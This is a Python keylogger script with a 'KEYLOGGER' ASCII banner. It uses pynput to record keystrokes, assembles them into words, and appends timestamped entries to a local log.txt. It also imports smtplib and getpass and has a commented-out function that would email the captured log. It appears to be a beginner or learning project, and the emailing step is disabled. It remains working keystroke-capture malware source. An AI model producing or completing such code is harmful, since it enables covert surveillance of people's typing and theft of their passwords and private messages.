from pynput.keyboard import Key, Listener
from datetime import datetime
import getpass
import smtplib
# reference code form full_2.py
# to add Atribute Error keys -> !!
# check for 2 different mails

print("""
.-. .-')     ('-.                                                               ('-.  _  .-')   
\  ( OO )  _(  OO)                                                            _(  OO)( \( -O )  
,--. ,--. (,------. ,--.   ,--.,--.      .-'),-----.   ,----.      ,----.    (,------.,------.  
|  .'   /  |  .---'  \  `.'  / |  |.-') ( OO'  .-.  ' '  .-./-')  '  .-./-')  |  .---'|   /`. ' 
|      /,  |  |    .-')     /  |  | OO )/   |  | |  | |  |_( O- ) |  |_( O- ) |  |    |  /  | | 
|     ' _)(|  '--.(OO  \   /   |  |`-' |\_) |  |\|  | |  | .--, \ |  | .--, \(|  '--. |  |_.' | 
|  .   \   |  .--' |   /  /\_ (|  '---.'  \ |  | |  |(|  | '. (_/(|  | '. (_/ |  .--' |  .  '.' 
|  |\   \  |  `---.`-./  /.__) |      |    `'  '-'  ' |  '--'  |  |  '--'  |  |  `---.|  |\  \  
`--' '--'  `------'  `--'      `------'      `-----'   `------'    `------'   `------'`--' '--' 
""")

# after user hits a certain amount of keys, we'll load that into the txt file
count = 0
keys = []
full_log = ""
word = ""
char_limit = 5

def on_press(key):
    global keys, count, full_log, word, char_limit
    keys.append(key)
    count += 1
    # print("{0} pressed".format(key))

    try:
        # print("{0} pressed".format(key.char))
        if key == Key.space:
            word += " "
            full_log += word
            word = ""
        elif key == Key.enter:
            # word += "\n"
            word += " "
            full_log += word
            word = ""
        elif key == Key.backspace:
            pass
            # word = word[:-1]
        elif str(key).find('Key') == -1:
            char = f'{key}'
            char = char[1:-1]
            word += char
        else:
            print(key)

        if len(full_log) > char_limit:
            write_file(full_log)
            full_log = ""

    except AttributeError:
        pass
    # if count >= 5: # every 5 keys we will update the file
    #     count = 0
    #     write_file(keys)
    #     keys = []

# w for first time, if no file exists, then change it to 'a'

def write_file(full_log):
    # with open("log.txt", "a") as f:
    #     for key in keys:
    #         k = str(key).replace("'", "")
    #         if k.find('space') > 0:
    #             f.write('\n')
    #         elif k.find('Key') == -1:
    #             f.write(k)
    nowObj = datetime.now()

    dateObj = nowObj.date()
    date = dateObj.strftime("%d-%b-%Y")

    timeObj = nowObj.time()
    time = timeObj.strftime("%H:%M:%S")

    full_log = "{}_{}_{}\n".format(date, time, full_log)
    with open("log.txt", "a") as file:
        print(full_log)
        #
        # send_log()
        #
        file.write(full_log)
        file.close()

def on_release(key):
    if key == Key.esc:
        return False

#
# def send_log():
#     server.sendmail(
#         email,
#         email,
#         full_log
#     )
#


# functions called when a key is pressed or released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    # will constantly keep on running the loop until we break out of it

